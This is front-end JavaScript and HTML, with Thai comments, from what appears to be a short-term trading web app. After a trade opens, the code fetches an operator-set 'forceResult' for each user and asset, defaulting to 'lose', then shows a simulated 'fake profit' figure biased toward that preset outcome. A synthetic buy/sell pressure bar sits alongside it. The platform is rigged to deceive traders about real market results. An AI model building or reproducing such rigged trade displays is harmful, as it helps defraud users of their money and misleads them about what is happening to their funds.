async function openTrade(type){

  try{

    const token = localStorage.getItem("token");

    // 🔥 ดึงค่า input
    const amount = Number(document.getElementById("amountInput").value);
    const symbol = currentSymbol; // 👉 ต้องมีตัวนี้อยู่แล้ว
    const duration = selectedTime;
    const percent = tradeConfig[selectedTime].percent;
    const currentMinAmount = tradeConfig[selectedTime].min;

    if(amount < currentMinAmount){
    showAlert(`ยอดเงินที่ป้อนไม่เพียงพอ 
    ขั้นต่ำของ ${formatTime(selectedTime)} คือ $${currentMinAmount.toLocaleString()}`);
    return;
    }

    const price = getCurrentPrice(currentSymbol);

    // ❌ กัน error
    if(!price || isNaN(price)){
      showAlert("ราคาโหลดไม่ทัน");
      return;
    }

    if(!amount || amount <= 0){
      showAlert("ใส่จำนวนเงินให้ถูกต้อง");
      return;
    }

    // 🔥 ยิง API
    const res = await fetch(`${API_URL}/api/trade/open`,{
      method:"POST",
      headers:{
        "Content-Type":"application/json",
        "Authorization":"Bearer " + token
      },
      body: JSON.stringify({
        type,
        amount,
        symbol,
        duration,
        percent,
        price
      })
    });

    const data = await res.json();

    if(!res.ok){
      showAlert(data.message || "เปิดออเดอร์ไม่สำเร็จ");
      return;
    }

    document.getElementById("userBalance").innerText =
    "$" + data.balance.toLocaleString(undefined,{
    minimumFractionDigits:2
     });
    data.order.userId = localStorage.getItem("userId");
    // ✅ render order
    renderOrder(data.order);

    // ✅ start timer
    startTimer(data.order);

    // ✅ start fake profit
   data.order.profitInterval = startProfitSimulation(data.order);

   // 🔊 PLAY SOUND
   orderSound.currentTime = 0;
   orderSound.play();

    // 🎉 success
    console.log("OPEN SUCCESS", data);

  }catch(err){
    console.log("OPEN ERROR:", err);
    alert("Server error");
  }
}

async function startProfitSimulation(order){

  const token = localStorage.getItem("token");

  let forceResult = "lose";

  // 🔥 ไปถาม backend ว่า asset นี้ win ไหม
  try{
    const res = await fetch(
      `${API_URL}/api/admin/get-trade-setting?userId=${order.userId}&symbol=${order.symbol.split(":")[1]}`,
      {
        headers:{
          "Authorization":"Bearer " + token
        }
      }
    );

    const data = await res.json();
    forceResult = data.forceResult;

  }catch(err){
    console.log("โหลด setting ไม่ได้");
  }

  let profit = 0;

  const el = document.getElementById("profit-" + order._id);

  const maxProfit = order.amount * (order.percent / 100);

  const interval = setInterval(()=>{

   // 🎲 สุ่มขึ้นลง (ทุกออเดอร์มีเขียวแดงหมด)
const change = Math.random() * order.amount * 0.04;

// bias ตามผลที่ต้องการ
let direction;

if(forceResult === "win"){
  direction = Math.random() > 0.4 ? 1 : -1; // เขียวเยอะกว่า
}else{
  direction = Math.random() > 0.6 ? 1 : -1; // แดงเยอะกว่า
}

profit += direction * change;

// 🎯 กันไม่ให้ทะลุ
if(profit > maxProfit) profit = maxProfit - Math.random()*2;
const maxLoss = order.amount * (order.percent / 100);

if(profit < -maxLoss) profit = -maxLoss + Math.random()*1;
    
   // ⏱ คำนวณเวลา
const now = new Date();
const open = new Date(order.openTime);
const total = order.duration * 60;

const timePassed = Math.floor((now - open) / 1000);
const timeLeft = total - timePassed;

// 🔥 ล็อคผล 3 วิสุดท้าย
if(timeLeft <= 3){
  if(forceResult === "win"){

  const change = Math.random() * order.amount * 0.03;
  profit += (Math.random() - 0.5) * change;

}else{

  const change = Math.random() * order.amount * 0.03;
  profit += (Math.random() - 0.5) * change;

}
}

    if(el){

      el.innerText = "$" + profit.toFixed(2);

      if(profit >= 0){
  el.className = "text-green-400 text-sm";
}else{
  el.className = "text-red-400 text-sm";
}

    }

  },500);

  return interval;
}

let marketPower = 50;

window.addEventListener("priceMove", (e) => {

  const { price, lastPrice } = e.detail;

  if(!lastPrice) return;

  const diff = price - lastPrice;

  let strength = diff * 5;

  if(strength > 5) strength = 5;
  if(strength < -5) strength = -5;

  marketPower += strength;

  // noise นิดเดียว
  marketPower += (Math.random() - 0.5) * 1.5;

  if(marketPower > 95) marketPower = 95;
  if(marketPower < 5) marketPower = 5;

  const buy = Math.floor(marketPower);
  const sell = 100 - buy;

  document.getElementById("buyPercent").innerText = buy + "%";
  document.getElementById("sellPercent").innerText = sell + "%";
  document.getElementById("powerBar").style.width = buy + "%";

});

      <button onclick="selectDuration(5,'00:05:00')" class="duration-btn">00:05:00</button>
      <button onclick="selectDuration(20,'00:20:00')" class="duration-btn">00:20:00</button>
      <button onclick="selectDuration(60,'01:00:00')" class="duration-btn">01:00:00</button>

    </div>

    <!-- CLOSE -->
    <button onclick="closeDurationModal()"
      class="mt-5 w-full py-3 rounded-xl bg-gray-900 text-white font-bold active:scale-95 transition">
      ปิด
    </button>

  </div>
</div>

<div id="marketPanel"
class="hidden fixed inset-0 bg-[#0a0a0a] z-50 flex flex-col">

  <!-- HEADER -->
  <div class="p-4 flex items-center gap-3 border-b border-white/5">

  <div class="flex-1 relative">
    <input id="searchAsset"
      placeholder="Search asset..."
      class="w-full bg-[#111315] px-4 py-2.5 rounded-xl text-white outline-none border border-white/5 focus:border-green-400 transition">

  </div>

  <button onclick="toggleMarket()"
    class="text-gray-400 hover:text-red-400 text-xl transition">
    ✕
  </button>

</div>

  <!-- CATEGORY -->
<div id="categoryTabs"
  class="flex items-center gap-2 px-3 py-2 overflow-x-auto no-scrollbar
         sticky top-0 z-10 bg-[#0a0a0a]">

  <button data-type="all" class="cat-btn active">All</button>
  <button data-type="crypto" class="cat-btn">Crypto</button>
  <button data-type="stock" class="cat-btn">Stock</button>
  <button data-type="commodity" class="cat-btn">Commodity</button>
  <button data-type="etf" class="cat-btn">ETF</button>

</div>

  <!-- LIST -->
  <div id="marketList" class="flex flex-col gap-3 px-3 pb-3 overflow-y-auto"></div>

</div>


<!-- 🔥 Custom Alert -->
<div id="customAlert" class="hidden fixed inset-0 bg-black/40 z-50 flex items-center justify-center">

  <div class="bg-gray-700/60 backdrop-blur-md w-[85%] max-w-sm rounded-2xl p-6 text-center shadow-xl">

    <!-- TEXT ONLY -->
    <div id="alertText" class="text-white text-sm leading-relaxed mb-6"></div>

    <!-- BUTTON -->
    <button onclick="closeAlert()"
      class="w-full py-3 rounded-xl bg-gray-900 text-white font-bold active:scale-95 transition">
      ตกลง
    </button>

  </div>

</div>
</body>
</html>
